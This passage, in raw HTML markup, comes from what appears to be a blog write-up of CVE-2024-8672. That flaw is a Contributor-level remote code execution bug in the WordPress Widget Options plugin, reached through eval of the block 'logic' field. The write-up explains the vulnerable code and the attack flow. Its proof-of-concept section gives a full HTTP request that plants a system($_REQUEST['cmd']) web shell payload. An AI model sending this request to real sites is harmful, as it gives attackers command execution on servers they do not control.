class=&#34;s1&#34;&gt;&amp;#39;logic&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&#x9;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;display&amp;ensp;widget&amp;ensp;logic&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&#x9;&#x9;&#x9;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$opts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;class&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$opts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;class&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;logic&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$opts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;class&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;logic&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]))&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&#x9;&#x9;&lt;span class=&#34;nv&#34;&gt;$display_logic&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;stripslashes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;trim&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$opts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;class&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;logic&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]));&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&#x9;&#x9;&lt;span class=&#34;nv&#34;&gt;$display_logic&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;apply_filters&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;widget_options_logic_override_block&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$display_logic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&#x9;&#x9;&lt;span class=&#34;nv&#34;&gt;$display_logic&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;apply_filters&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;extended_widget_options_logic_override_block&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$display_logic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&#x9;&#x9;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$display_logic&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;===&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&#x9;&#x9;&#x9;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&#x9;&#x9;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&#x9;&#x9;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$display_logic&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;===&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&#x9;&#x9;&#x9;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&#x9;&#x9;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&#x9;&#x9;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;if&amp;ensp;(stristr($display_logic,&amp;ensp;&amp;#34;return&amp;#34;)&amp;ensp;===&amp;ensp;false)&amp;ensp;{&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&#x9;&#x9;&#x9;&#x9;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;&#x9;$display_logic&amp;ensp;=&amp;ensp;&amp;#34;return&amp;ensp;(&amp;#34;&amp;ensp;.&amp;ensp;$display_logic&amp;ensp;.&amp;ensp;&amp;#34;);&amp;#34;;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&#x9;&#x9;&#x9;&#x9;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;}&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&#x9;&#x9;&#x9;&#x9;&lt;span class=&#34;nv&#34;&gt;$display_logic&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;htmlspecialchars_decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$display_logic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;ENT_QUOTES&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&#x9;&#x9;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;widgetopts_safe_eval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$display_logic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&#x9;&#x9;&#x9;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&#x9;&#x9;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&#x9;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Line 4 checks whether &lt;code&gt;Gutenberg&amp;ensp;Page&amp;ensp;&amp;amp;&amp;ensp;Post&amp;ensp;Block&amp;ensp;Options&lt;/code&gt; is enabled; we enable it in the Admin Dashboard.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-12-04-cve-2024-8672/enable.png&#34; title=&#34;Enable Gutenberg Page &amp;amp; Post Block Options&#34; data-thumbnail=&#34;/posts/2025-12-04-cve-2024-8672/enable.png&#34; data-sub-html=&#34;&lt;h2&gt;enable&lt;/h2&gt;&lt;p&gt;Enable Gutenberg Page &amp;amp; Post Block Options&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-04-cve-2024-8672/enable.png&#39; alt=&#34;enable&#34; height=&#34;670&#34; width=&#34;1676&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Enable Gutenberg Page &amp; Post Block Options&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;On line 6 and line 8, the code checks whether the &lt;strong&gt;logic&lt;/strong&gt; field exists and is not empty. If this condition is met, the function &lt;code&gt;widgetopts_safe_eval($display_logic)&lt;/code&gt; is called, resulting in the execution of any command passed into it.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-12-04-cve-2024-8672/logic.png&#34; title=&#34;Logic field when submitting a post&#34; data-thumbnail=&#34;/posts/2025-12-04-cve-2024-8672/logic.png&#34; data-sub-html=&#34;&lt;h2&gt;Logic&lt;/h2&gt;&lt;p&gt;Logic field when submitting a post&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-04-cve-2024-8672/logic.png&#39; alt=&#34;Logic&#34; height=&#34;723&#34; width=&#34;774&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Logic field when submitting a post&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Here, when using a &lt;strong&gt;Contributor&lt;/strong&gt; account to create a post, the logic field appears in the request with the value set as a &lt;code&gt;payload&lt;/code&gt;. We can fully control this field.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;pre class=&#34;mermaid&#34;&gt;&#xD;&#xA;graph&amp;ensp;TD&#xD;&#xA;A[&#34;Attacker&amp;ensp;has&amp;ensp;a&amp;ensp;Contributor&amp;ensp;(or&amp;ensp;higher)&amp;ensp;account&#34;]&#xD;&#xA;--&gt;&amp;ensp;B[&#34;Creates&amp;ensp;or&amp;ensp;edits&amp;ensp;a&amp;ensp;post&amp;ensp;using&amp;ensp;Gutenberg&#34;]&#xD;&#xA;&#xD;&#xA;B&amp;ensp;--&gt;&amp;ensp;C[&#34;Inserts&amp;ensp;malicious&amp;ensp;PHP&amp;ensp;into&amp;ensp;the&amp;ensp;&#39;Logic&#39;&amp;ensp;field&amp;ensp;(extended_widget_opts)&#34;]&#xD;&#xA;C&amp;ensp;--&gt;&amp;ensp;D[&#34;Payload&amp;ensp;is&amp;ensp;saved&amp;ensp;in&amp;ensp;block&amp;ensp;attributes&#34;]&#xD;&#xA;&#xD;&#xA;D&amp;ensp;--&gt;&amp;ensp;E[&#34;render_block&amp;ensp;hook&amp;ensp;is&amp;ensp;triggered&#34;]&#xD;&#xA;E&amp;ensp;--&gt;&amp;ensp;F[&#34;blockopts_filter_before_display()&amp;ensp;is&amp;ensp;executed&#34;]&#xD;&#xA;&#xD;&#xA;F&amp;ensp;--&gt;&amp;ensp;G[&#34;widgetopts_safe_eval()&amp;ensp;is&amp;ensp;called&#34;]&#xD;&#xA;G&amp;ensp;--&gt;&amp;ensp;H[&#34;eval()&amp;ensp;executes&amp;ensp;the&amp;ensp;attacker’s&amp;ensp;payload&#34;]&#xD;&#xA;&#xD;&#xA;H&amp;ensp;--&gt;&amp;ensp;I[&#34;Remote&amp;ensp;Code&amp;ensp;Execution&amp;ensp;on&amp;ensp;the&amp;ensp;server&#34;]&#xD;&#xA;&lt;/pre&gt;&lt;/div&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Using an Administrator account, enable the option &lt;strong&gt;Gutenberg Page &amp;amp; Post Block Options&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;Create a post with a Contributor account:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;POST&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nn&#34;&gt;/index.php/wp-json/wp/v2/posts/170?_locale=user&amp;amp;cmd=ls+/&lt;/span&gt;&amp;ensp;&lt;span class=&#34;kr&#34;&gt;HTTP&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1.1&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Host&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;l&#34;&gt;localhost&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;...&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;g&#34;&gt;{&amp;#34;id&amp;#34;:170,&amp;#34;title&amp;#34;:&amp;#34;testing&amp;#34;,&amp;#34;content&amp;#34;:&amp;#34;&amp;lt;!--&amp;ensp;wp:paragraph&amp;ensp;{\&amp;#34;atts\&amp;#34;:{\&amp;#34;id_base\&amp;#34;:-1,\&amp;#34;column\&amp;#34;:{\&amp;#34;desktop\&amp;#34;:\&amp;#34;12\&amp;#34;,\&amp;#34;tablet\&amp;#34;:\&amp;#34;12\&amp;#34;,\&amp;#34;mobile\&amp;#34;:\&amp;#34;12\&amp;#34;},\&amp;#34;alignment\&amp;#34;:{\&amp;#34;desktop\&amp;#34;:\&amp;#34;default\&amp;#34;,\&amp;#34;tablet\&amp;#34;:\&amp;#34;default\&amp;#34;,\&amp;#34;mobile\&amp;#34;:\&amp;#34;default\&amp;#34;},\&amp;#34;roles\&amp;#34;:{\&amp;#34;state\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;options\&amp;#34;:\&amp;#34;hide\&amp;#34;},\&amp;#34;visibility\&amp;#34;:{\&amp;#34;selected\&amp;#34;:\&amp;#34;0\&amp;#34;,\&amp;#34;options\&amp;#34;:\&amp;#34;hide\&amp;#34;,\&amp;#34;acf\&amp;#34;:{\&amp;#34;visibility\&amp;#34;:\&amp;#34;hide\&amp;#34;,\&amp;#34;field\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;condition\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;value\&amp;#34;:\&amp;#34;\&amp;#34;}},\&amp;#34;author_page\&amp;#34;:{\&amp;#34;author_pages\&amp;#34;:{\&amp;#34;selections\&amp;#34;:\&amp;#34;1\&amp;#34;}},\&amp;#34;devices\&amp;#34;:{\&amp;#34;options\&amp;#34;:\&amp;#34;hide\&amp;#34;},\&amp;#34;days\&amp;#34;:{\&amp;#34;options\&amp;#34;:\&amp;#34;hide\&amp;#34;},\&amp;#34;dates\&amp;#34;:{\&amp;#34;options\&amp;#34;:\&amp;#34;hide\&amp;#34;,\&amp;#34;from\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;to\&amp;#34;:\&amp;#34;\&amp;#34;},\&amp;#34;styling\&amp;#34;:{\&amp;#34;selected\&amp;#34;:\&amp;#34;0\&amp;#34;,\&amp;#34;bg_image\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;background\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;background_hover\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;heading\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;text\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;links\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;links_hover\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;border_color\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;border_type\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;border_width\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;background_input\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;text_input\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;border_color_input\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;border_type_input\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;border_width_input\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;background_submit\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;background_submit_hover\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;text_submit\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;border_color_submit\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;border_type_submit\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;border_width_submit\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;list_border_color\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;table_border_color\&amp;#34;:\&amp;#34;\&amp;#34;},\&amp;#34;class\&amp;#34;:{\&amp;#34;selected\&amp;#34;:\&amp;#34;0\&amp;#34;,\&amp;#34;link\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;id\&amp;#34;:\&amp;#34;a\&amp;#34;,\&amp;#34;classes\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;animation\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;event\&amp;#34;:\&amp;#34;enters\&amp;#34;,\&amp;#34;speed\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;offset\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;delay\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;logic\&amp;#34;:\&amp;#34;system($_REQUEST[\&amp;#34;cmd\&amp;#34;])\&amp;#34;},\&amp;#34;tabselect\&amp;#34;:\&amp;#34;0\&amp;#34;},\&amp;#34;dateUpdated\&amp;#34;:123}&amp;ensp;--&amp;gt;\n&amp;lt;p&amp;gt;Payload&amp;lt;/p&amp;gt;\n&amp;lt;!--&amp;ensp;/wp:paragraph&amp;ensp;--&amp;gt;&amp;#34;,&amp;#34;status&amp;#34;:&amp;#34;pending&amp;#34;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-12-04-cve-2024-8672/result.png&#34; title=&#34;Result&#34; data-thumbnail=&#34;/posts/2025-12-04-cve-2024-8672/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Result&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-04-cve-2024-8672/result.png&#39; alt=&#34;Result&#34; height=&#34;868&#34; width=&#34;1491&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Result&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;The vulnerability in &lt;strong&gt;Widget Options &amp;lt;= 4.0.7&lt;/strong&gt; stems from the &lt;strong&gt;unsafe use of &lt;code&gt;eval()&lt;/code&gt;&lt;/strong&gt; in the &lt;strong&gt;display logic&lt;/strong&gt; feature. User-controlled data from the block attribute &lt;code&gt;extended_widget_opts&lt;/code&gt; is passed directly into the &lt;code&gt;widgetopts_safe_eval()&lt;/code&gt; function without &lt;strong&gt;proper validation, filtering, or sanitization&lt;/strong&gt;. This allows an &lt;strong&gt;authenticated&lt;/strong&gt; attacker with &lt;strong&gt;Contributor (or higher)&lt;/strong&gt; privileges to inject and execute arbitrary PHP code during block rendering, leading to &lt;strong&gt;Remote Code Execution (RCE)&lt;/strong&gt; on the 